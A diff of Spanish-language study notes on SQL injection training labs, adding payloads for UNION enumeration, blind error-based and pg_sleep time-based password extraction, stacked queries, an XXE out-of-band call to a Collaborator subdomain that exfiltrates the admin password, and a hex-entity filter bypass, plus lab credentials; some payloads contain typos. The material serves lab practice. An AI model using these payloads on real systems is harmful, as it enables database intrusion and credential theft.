@@ -202,6 +202,10 @@ Gifts' order by 2-- -
 
 
 
+
+
+
+
 # Laboratorio: ataque UNION de inyección SQL, que determina el número de columnas devueltas por la consulta
 
 Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puede utilizar un ataque UNION para recuperar datos de otras tablas. El primer paso de un ataque de este tipo es determinar la cantidad de columnas que devuelve la consulta. Luego utilizarás esta técnica en laboratorios posteriores para construir el ataque completo.
@@ -222,6 +226,10 @@ Gifts' order by 2-- -
 
 
 
+
+
+
+
 # Laboratorio: ataque UNION de inyección SQL, búsqueda de una columna que contiene texto
 
 Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de producto. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puede utilizar un ataque UNION para recuperar datos de otras tablas. Para construir un ataque de este tipo, primero es necesario determinar la cantidad de columnas devueltas por la consulta. Puedes hacer esto usando una técnica que aprendiste en un laboratorio anterior. El siguiente paso es identificar una columna que sea compatible con datos de cadena.
@@ -239,6 +247,16 @@ Gifts' order by 3-- -
 
 
 ' union SELECT null,'G0Puak',null -- -
+
+
+
+
+
+
+
+
+
+
 
 
 # Laboratorio: ataque UNION de inyección SQL, recuperación de datos de otras tablas
@@ -309,7 +327,11 @@ Los pasos clave son:
 - administrator-p1q9m1m3yg1lmnh4l30s
 
 
-# Inyección SQL ciega con respuestas condicionales [1/3]
+
+
+
+
+# Inyección SQL ciega con respuestas condicionales
 
 ## Laboratorio: Inyección SQL ciega con respuestas condicionales
 
@@ -347,7 +369,15 @@ administrator  48rgszdjihweim2hstf4
 - 01-Blind_SQL_conditional_responses.py
 
 
-# Laboratorio: Inyección SQL ciega con errores condicionales
+
+
+
+
+
+
+# Inyección SQL ciega con errores condicionales
+
+## Laboratorio: Inyección SQL ciega con errores condicionales
 
 Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.
 
@@ -373,21 +403,41 @@ En esta clase continuamos con la explotación de la inyección SQL ciega basada 
 
 Aplicamos lo aprendido para automatizar la obtención de cada carácter de la contraseña utilizando Burp Intruder, apoyándonos en respuestas con error (código 500) para saber si el carácter probado es correcto. Se recorre así toda la cadena de forma sistemática.
 
-
+**Oracle**
 
 ### Tamano de la constrasena
 
-'|| (select case when length(password)> 21 then to_char(1/0) else '' and from users where unsername='administrator')||'
+' order by 1 -- -
+
+
+' union select '1' from dual -- -
+
+
+' || (select '1' from dual) || '
+
+
+'|| (select case when length(password)> 21 then to_char(1/0) else '' and from users where username='administrator')||'
+
 
 ### Constrasena
 
-'|| (select case when substr(password,1,1)='c' then to_char(1/0) else '' and from users where unsername='administrator')||'
+
+'|| (select case when substr(password,1,1)='c' then to_char(1/0) else '' and from users where username='administrator')||'
+
 
 
 
 administrator  ir5irznuql3pyv7hexn8
 
-# Laboratorio: Inyección SQL visible basada en errores
+
+
+
+
+
+
+# Inyección SQL basada en errores visibles
+
+## Laboratorio: Inyección SQL visible basada en errores
 
 Este laboratorio contiene una vulnerabilidad de inyección SQL. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada. Los resultados de la consulta SQL no se devuelven.
 
@@ -404,13 +454,23 @@ Analizamos paso a paso cómo:
 
 
 
-- ' or 1= cast((select username from user limit 1 ) as INT)-- -
+- ' or 1= cast((select username from users limit 1 ) as INT)-- -
 
-- ' or 1= cast((select password from user limit 1) as INT)-- -
+- ' or 1= cast((select password from users limit 1) as INT)-- -
 
 
 
-# Laboratorio: Inyección SQL ciega con retrasos de tiempo
+r73iz9oletj5j3ddim27
+
+
+
+
+
+
+
+# Inyección SQL ciega mediante retrasos temporales
+
+## Laboratorio: Inyección SQL ciega con retrasos de tiempo
 
 Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.
 
@@ -430,7 +490,14 @@ La aplicación no muestra errores ni cambios en la respuesta al procesar la cook
 
 
 
-# Laboratorio: Inyección SQL ciega con retrasos de tiempo y recuperación de información
+
+
+
+
+
+# Inyección SQL ciega con retrasos y exfiltración de datos 
+
+## Laboratorio: Inyección SQL ciega con retrasos de tiempo y recuperación de información
 
 Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.
 
@@ -454,16 +521,43 @@ Para resolver el laboratorio, inicie sesión como administrator usuario.
 
 **EJEMPLO**
 
+
+' || pg_sleep(10) -- -
+
+
+
 %3b  --> Exadecimal   ---> ;
+
+
+
+' %3b select case when length(password)=20 then pg_sleep(5) else null end from users where username='administrator' -- -
 
 '%3b select case when(username='administrator' and length(password)=20) then pg_sleep(5) else pg_sleep(0) en from users -- -
 
+
+' %3b select case when  substring(password,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator' -- -
 
 '%3b select case when(username='administrator' and substring(password,1,1)='a' ) then pg_sleep(5) else pg_sleep(0) en from users -- -
 
 
 
-# Laboratorio: Inyección SQL ciega con interacción fuera de banda
+
+and (select substr(password,1,1) from users where username='administrator')='a'
+ 'or (select case when substring(password,1,1)='a' then pg_sleep(10) else pg_sleep(0) end from users where username = 'administrator') is not null-- -
+
+
+
+
+
+
+
+
+
+
+
+# Inyección SQL ciega con interacción out-of-band (OOB)
+
+## Laboratorio: Inyección SQL ciega con interacción fuera de banda
 
 Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.
 
@@ -478,7 +572,17 @@ Para resolver el laboratorio, aproveche la vulnerabilidad de inyección SQL para
 - Combinamos la inyección SQL con una entidad externa en XML (XXE) que genera una solicitud automática a un subdominio de Collaborator, confirmando así que la inyección fue ejecutada aunque no haya evidencia directa en la respuesta HTTP.
 
 
-# Laboratorio: Inyección SQL ciega con exfiltración de datos fuera de banda
+
+
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %25remote%3b]>'),'/l') FROM dual
+
+
+
+
+
+# Exfiltración de datos por canal OOB en Inyección SQL
+
+## Laboratorio: Inyección SQL ciega con exfiltración de datos fuera de banda
 
 Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.
 
@@ -503,7 +607,17 @@ remote SYSTEM "http://'||(select password from users where username='administrat
 
 session=GknxCGss@6A1lpHSaxkE1ZY91z6sfhXrU
 
-# Laboratorio: Inyección SQL con omisión de filtro mediante codificación XML
+
+
+
+
+
+
+
+
+# Bypass de filtros con codificación XML en Inyección SQL
+
+## Laboratorio: Inyección SQL con omisión de filtro mediante codificación XML
 
 Este laboratorio contiene una vulnerabilidad de inyección SQL en su función de verificación de stock. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puede utilizar un ataque UNION para recuperar datos de otras tablas.
 
@@ -515,3 +629,28 @@ La base de datos contiene un users tabla, que contiene los nombres de usuario y 
 - Para evadir este filtro, aplicamos codificación de entidades XML (por ejemplo, hexadecimal o decimal), utilizando herramientas como la extensión Hackvertor en Burp Suite. Este bypass permite que el payload pase desapercibido y sea ejecutado por el backend.
 
 - A través de prueba y error, determinamos que la consulta original solo permite devolver una columna, por lo que concatenamos ‘username‘ y ‘password‘ con un separador (~) para extraer los datos de la tabla ‘users‘ en una sola columna.
+
+
+
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>5</productId><storeId>1 order by 1</storeId></stockCheck>
+
+
+
+(select password from users where username='administrator')
+
+**Usar la extension Hackvertor**
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+<productId>5</productId>
+<storeId>
+    <@hex_entities>1 union select password from users where username='administrator'</@hex_entities>
+</storeId>
+</stockCheck>
+
+
+
+
+https://infosecmachines.io/
